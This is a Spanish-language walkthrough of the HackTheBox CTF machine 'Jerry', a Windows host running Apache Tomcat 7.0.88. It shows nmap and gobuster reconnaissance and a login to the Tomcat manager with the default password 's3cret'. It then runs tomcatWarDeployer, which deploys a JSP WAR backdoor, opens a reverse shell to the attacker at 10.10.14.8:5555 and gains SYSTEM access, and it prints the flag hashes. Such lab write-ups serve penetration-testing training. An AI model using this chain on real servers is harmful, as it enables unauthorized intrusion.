# HackTheBox JERRY Walkthrough

## Introducción 

Jerry es una máquina virtual de tipo CTF suministrada por HackTheBox creada por "mrh4sh". Esta basada en Microsoft Windows OS, en esta ocasión mostraré los pasos que tome para comprometer la maquina.

## Recolección de información

```
[mcruz@lilo ~]# export ip=10.10.10.95
[mcruz@lilo ~]# nmap -sC -sS -sV -A $ip
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2008|7|Vista (91%)

```
Podemos ver en la salida de nmap el puerto 8080 esta abierto corriendo Apache Tomcat/Coyote JSP engine 1.1, con una posible version de Windows (Microsoft Windows 2012|2008|7|Vista).

Si entramos a la dirección http://10.10.10.95:8080 se puede notar una instalación por defecto de Apache Tomcat/7.0.88, procedemos a correr gobuster en busca de directorios que puedan servirnos.


```
[mcruz@lilo ~]# gobuster -u http://$ip:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 

```
Esto nos da una lista de directorios encontrados, el que nos interesa es el “/manager”

Poniendo los credenciales “admin:admin” no resulto, leyendo el error pude darme cuenta de los passwords por defecto que utiliza la aplicación, trate con “admin:s3cret” y todo funciona.

Luego de la información obtenida con nmap y gobuster, buscamos un exploit para el Apache Tomcat/Coyote JSP engine 1.1. Con searchsploit no obtuve ningun resultado, buscamo en GOOGLE de la siguiente manera: "exploit tomcat war file". En caso de no tener conocimiento de que son los archivos WAR  -- https://en.wikipedia.org/wiki/WAR_(file_format) -- 

Usando metasploit es posible con el tomcat_mgr_upload, pero para esta maquina no tuve exito.

Encontré https://github.com/mgeeky/tomcatWarDeployer una herramienta para pwning WAR de tomcat muy funcional. Leyendo el manual de ayuda pude identificar las opciones a utilizar.

```
[mcruz@lilo ~]# git clone https://github.com/mgeeky/tomcatWarDeployer
[mcruz@lilo ~]# cd tomcatWarDeployer
[mcruz@lilo ~]# python tomcatWarDeployer.py -v -x -p 5555 -H 10.10.14.8 10.10.10.95:8080
INFO: Reverse shell will connect to: 10.10.14.8:5555.
DEBUG: Browsing to "http://10.10.10.95:8080/"... Creds: "tomcat:s3cret"
DEBUG: Trying to fetch: "http://10.10.10.95:8080/"
DEBUG: Probably found something: Apache Tomcat/7.0.88
DEBUG: Trying to fetch: "http://10.10.10.95:8080/manager"
DEBUG: Probably found something: Apache Tomcat/7.0.88
DEBUG: Apache Tomcat/7.0.88 Manager Application reached & validated.
DEBUG: Generating JSP WAR backdoor code...
DEBUG: Preparing additional code for Reverse TCP shell
DEBUG: Generating temporary structure for jsp_app WAR at: "/tmp/tmp94hvDg"
DEBUG: Working with Java at version: 1.8.0_144
DEBUG: Generating web.xml with servlet-name: "JSP Application"
DEBUG: Generating WAR file at: "/tmp/jsp_app.war"
DEBUG: added manifest
adding: files/(in = 0) (out= 0)(stored 0%)
adding: files/WEB-INF/(in = 0) (out= 0)(stored 0%)
adding: files/WEB-INF/web.xml(in = 505) (out= 254)(deflated 49%)
adding: files/META-INF/(in = 0) (out= 0)(stored 0%)
adding: files/META-INF/MANIFEST.MF(in = 69) (out= 68)(deflated 1%)
adding: index.jsp(in = 4493) (out= 1682)(deflated 62%)
WARNING: Application with name: "jsp_app" is already deployed.
DEBUG: Unloading existing one...
DEBUG: Unloading application: "http://10.10.10.95:8080/jsp_app/"
DEBUG: Succeeded.
DEBUG: Deploying application: jsp_app from file: "/tmp/jsp_app.war"
DEBUG: Removing temporary WAR directory: "/tmp/tmp94hvDg"
DEBUG: Succeeded, invoking it...
DEBUG: Spawned shell handling thread. Awaiting for the event...
DEBUG: Awaiting for reverse-shell handler to set-up
DEBUG: Establishing listener for incoming reverse TCP shell at 10.10.14.8:5555
DEBUG: Socket is binded to local port now, awaiting for clients...
DEBUG: Invoking application at url: "http://10.10.10.95:8080/jsp_app/"
DEBUG: Adding 'X-Pass: K3n50PKbr0mp' header for shell functionality authentication.
DEBUG: Incoming client: 10.10.10.95:49200
DEBUG: Application invoked correctly.
INFO: JSP Backdoor up & running on http://10.10.10.95:8080/jsp_app/
INFO: Happy pwning. Here take that password for web shell: 'K3n50PKbr0mp'
INFO: Connected with: nt authority\system@JERRY

C:\apache-tomcat-7.0.88> whoami
nt authority\system


```
Nota: El script debe ser modificado en base a nuestras necesidades, poner como clave (s3cret) dentro del arreglo.

Esto nos dará una shell de Windows con altos privilegios "nt authority\system", lo que quiere decir que no tenemos que escalar privilegios.

```
C:\apache-tomcat-7.0.88> dir C:\Users\Administrator\Desktop\ 
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:09 AM    <DIR>          flags
               0 File(s)              0 bytes

```
```
C:\apache-tomcat-7.0.88> dir C:\Users\Administrator\Desktop\flags *.txt
 Volume in drive C has no label.
 Volume Serial Number is FC2B-E489

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               0 File(s)              0 bytes

```
El archivo que buscamos es 2 for the price of 1.txt, al tener espacios debemos mostrar su contenido con las comillas.

```
C:\apache-tomcat-7.0.88> type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
C:\Users\Administrator\Desktop\flags>

```




Con esto ya tenemos los has del usuario normal y el usuario root, los cuales tendremos que suministrar en HackTheBox.




**AUTOR:**

```
Michael Cruz Sánchez
Academia Código Libre Dominicano Junio 2018
<superlinux.michael5> at <gmail.com>

```



